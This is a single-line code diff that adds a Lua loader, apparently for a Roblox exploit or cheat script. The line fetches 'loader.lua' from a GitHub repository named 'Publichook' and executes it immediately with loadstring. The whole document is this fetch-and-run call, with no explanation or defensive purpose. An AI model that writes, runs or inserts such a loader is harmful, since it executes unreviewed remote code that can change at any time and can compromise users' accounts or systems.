@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/CalTheSkid/Publichook/main/loader.lua?nocache="..tostring(os.time())..tostring(math.random(100000, 999999))))()
